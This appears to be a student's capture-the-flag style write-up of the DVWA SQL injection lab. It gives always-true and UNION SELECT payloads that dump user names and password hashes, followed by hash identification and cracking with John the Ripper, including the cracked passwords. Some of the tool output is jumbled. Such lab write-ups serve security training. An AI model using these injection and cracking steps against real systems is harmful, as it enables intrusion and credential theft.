# Low level 
```
id=1&Submit=Submit#
```
putting 1 as input we get back the ID(The input), first name and surname fields
so its like 
```
select first_name, last_name from users where user_id = '1';
```
Putting a Single ' will resulting an Error 
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' '' '' at line 1
This happened because the query was user_id ' ';

Testing Always True Scenario, like 1=1
On the query, it looks like
```
WHERE user_id = 1' OR' 1 '=' 1
```
We have the First name and Surname fields of all 5 users. 
to find out if there are more fields on the databse we need to perform a UNION attack combined with ORDER BY clause, this work because after the order by clause indicates the column index, thus if we try order our table with value of, for example "5" while the table only has "4" then we will get an Unknown column error
for example 
ORDER BY 3
```
?id=%27+ORDER+BY+3--+&Submit=Submit#
```
will return:
Unknown column '3' in 'order clause'
That means there are only 2 Fields on the Table.

And now we can try to guess those fields by using ' UNION SELECT username, password FROM users#
and we got " Unknown column 'username' in 'field list' " as the Result
which means username is not one of the field from the table, but password is one of the fields, lets try changing it to something similar "user" for example:
```
' UNION SELECT user, password FROM users#
```
from the input we got the result:
```
ID: ' UNION SELECT user, password FROM users# 
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: ' UNION SELECT user, password FROM users# 
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: ' UNION SELECT user, password FROM users# 
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: ' UNION SELECT user, password FROM users# 
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: ' UNION SELECT user, password FROM users# 
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
since all the password are hashed we can use tool "Hashid" to find what form of hash these password uses
```
hashid 5f4dcc3b5aa765d61d8327deb882cf99
Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
and then find how MD5 format works 
eCryptfs, eigrp, electrum, ENCDataVault-MD5, ENCDataVault-PBKDF2, EncFS,
Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1,
Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1,
solarwinds, SSH, sspr, Stribog-256, Stribog-512, STRIP, SunMD5, SybaseASE,
433 formatsHMAC-MD5, HMAC-SHA1, HMAC-SHA224, HMAC-SHA256, HMAC-SHA384, HMAC-SHA512,

crack the hashes 
 $ john --format=Raw-MD5 hashes --wordlist=/usr/share/wordlists/rockyou.txt

 Using default input encoding: UTF-8
 Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
 Warning: no OpenMP support for this hash type, consider --fork=16
 Press 'q' or Ctrl-C to abort, almost any other key for status
 password         (?)
 abc123           (?)
 letmein          (?)
 charley          (?)
 4g 0:00:00:00 DONE (2023-12-12 16:49) 133.3g/s 102400p/s 102400c/s 179200C/s skyblue..dangerous
 Warning: passwords printed above might not be all those cracked
```

Medium:
Inspect the web
Edit the Value from the choice to the condition always true
for example 
```
1 OR 1 = 1
```
Higher difficulty:

on the change ID insert
```
'Session ID: 'UNION SELECT user,password from users#' 
```
